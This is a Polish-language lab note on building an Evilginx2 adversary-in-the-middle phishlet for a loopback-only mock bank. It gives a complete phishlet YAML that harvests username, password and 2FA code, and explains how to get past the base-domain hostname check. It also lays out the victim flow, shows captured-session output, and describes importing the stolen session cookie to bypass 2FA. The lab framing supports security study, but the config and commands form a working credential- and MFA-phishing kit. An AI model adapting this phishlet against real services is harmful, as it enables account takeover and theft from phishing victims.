---
title: "Evilginx2 Phishlet: mockbank (bank.local, AiTM + 2FA)"
date: 2026-08-16
tags: [evilginx2, phishlet, aitm, 2fa, lab, symulacja]
status: active
category: lab
---

# Evilginx2 Phishlet: mockbank

Nowy phishlet do laba AiTM — mock bank z logowaniem dwuetapowym (login → 2FA → dashboard).
Wszystko na loopback, bez realnych domen. Powiązane: [[Evilginx2_Lab]] · [[Lab/Hosts]].

## Komponenty

| Element | Ścieżka / wartość |
|---|---|
| Phishlet | `/opt/evilginx2/phishlets/mockbank.yaml` (symlink: `~/.evilginx2/phishlets/mockbank.yaml`) |
| Mock origin | `/opt/evilginx2/mock_bank_origin.py` — HTTPS na **127.0.0.3:443** (`bank.local`) |
| Cert | `/opt/evilginx2/bank.local.{crt,key}` — self-signed, SAN `bank.local`, IP `127.0.0.3` |
| Hosts | `127.0.0.3 bank.local` w `/etc/hosts` |
| Phish domena | `bank.local` (evilginx na 127.0.0.1:8443) |
| Lure | id 3, path `/IeCUvZpA` |

## Phishlet (mockbank.yaml)

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'bank.local', session: true, is_landing: true}
auth_tokens:
  - domain: .bank.local
    keys: ['session']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: '2fa_code'
      search: '(.*)'
      type: 'post'
login:
  domain: 'bank.local'
  path: '/login'
```

## Klucz: pole `credentials.custom` (2FA)

- Evilginx **3.3.0 CE obsługuje `credentials.custom`** — listę dodatkowych pól POST (poza username/password).
- Format: `key` (nazwa pola z formularza), `search` (regex na wartość), `type: post` (albo `json`).
- Przechwycenie w `http_proxy.go`: dla każdego klucza POST body matchującego `key` → `setSessionCustom()` → log `[+] Custom: [2fa_code] = [123456]`.
- Custom widoczny w `sessions <id>` w sekcji `[ custom ]` oraz w bazie.
- **Warunek przechwycenia:** `ps.SessionId != ""` — ofiara musi najpierw wejść na lure (cookie śledzące), potem dowolny POST z polem custom jest łapany (nie musi być na ścieżce login).

## Ustalenie: domena bazowa `local`

- Walidacja evilginx (config.go `SetSiteHostname`): hostname phishleta musi być **równy domenie bazowej** lub kończyć się na `.<domain>`.
- Domyślnie domena bazowa = `evil.local` → `bank.local` był odrzucany (`phishlet hostname must end with 'evil.local'`).
- **Fix:** `config domain local` w konsoli → domena bazowa `local` → i `evil.local`, i `bank.local` są poprawnymi subdomenami `.local`. Config zapisany do `config/config.json`.
- Wpisano też do `general.domain` w config.json (`"domain": "local"`).
- Uwaga: zmiana domeny bazowej **czyści hostname wszystkich phishletów** (mocklogin się wyłączył) — po zmianie ustawić ponownie: `phishlets hostname mocklogin evil.local` + `phishlets enable mocklogin`.

## Flow ofiary (symulacja, /tmp/bank_demo.py)

1. `GET /IeCUvZpA` (lure) → **302** → `https://bank.local/login` + cookie śledzące (`0f5e-55c3=...; Domain=local`)
2. `GET /login` → **200** (form username+password)
3. `POST /login` (username+password) → **302** → `/verify`
4. `GET /verify` → **200** (form 2FA)
5. `POST /verify` (`2fa_code=123456`) → **302** → `/dashboard` + **cookie rewrite**: `session=MOCKBANK_victim@corp.local; Domain=bank.local`
6. `GET /dashboard` → **200** `WELCOME, authenticated user`

## Przechwycenie (zweryfikowane)

`[+++] [4] Username: [victim@corp.local]`  
`[+++] [4] Password: [hunter2]`  
`[+++] [4] Custom: [2fa_code] = [123456]`  
`[+++] [4] all authorization tokens intercepted!`

Sesja 11 w `sessions`:

```
 id           : 11
 phishlet     : mockbank
 username     : victim@corp.local
 password     : hunter2
 tokens       : captured
 landing url  : https://bank.local/IeCUvZpA
 [ custom ]
  2fa_code  : 123456
 [ cookies ]
  session = MOCKBANK_victim@corp.local  (domain .bank.local)
```

To jest sedno AiTM z 2FA: atakujący ma username, hasło **i kod 2FA** (a cookie sesji można zaimportować przez StorageAce → pełne przejęcie sesji ofiary, 2FA obchodzone).

## Techniczne (lab artifacts)

- **SNI:** klient musi łączyć się z SNI=`bank.local` (evilginx wybiera phishlet po SNI; połączenie na IP wisi). Klient łączy się z `127.0.0.1:8443` z `server_hostname="bank.local"`.
- **HTTP parsing:** evilginx nie zamyka połączenia od razu po odpowiedzi — klient musi parsować Content-Length/chunked zamiast czekać na EOF.
- Skrypt testowy: `/tmp/bank_demo.py` (raw socket + TLS + cookie jar + parser HTTP).

## Reguły (jak w [[Evilginx2_Lab]])

1. Tylko loopback, `-developer`, self-signed, bez LE.
2. Mock origin to lokalna atrapa — brak realnych serwisów.
3. Sesje z dema wyczyścić po zakończeniu (`sessions` → brak komendy clear w CE, restart czyści).

## Status

- [x] Phishlet mockbank.yaml (w `/opt/evilginx2/phishlets/` + symlink w `~/.evilginx2/phishlets/`)
- [x] Mock origin bank.local na 127.0.0.3:443
- [x] 2FA przechwytywane (credentials.custom)
- [x] Test pełnego flow + sesja z tokenami (id 11)
- [x] mocklogin nadal działa (evil.local)
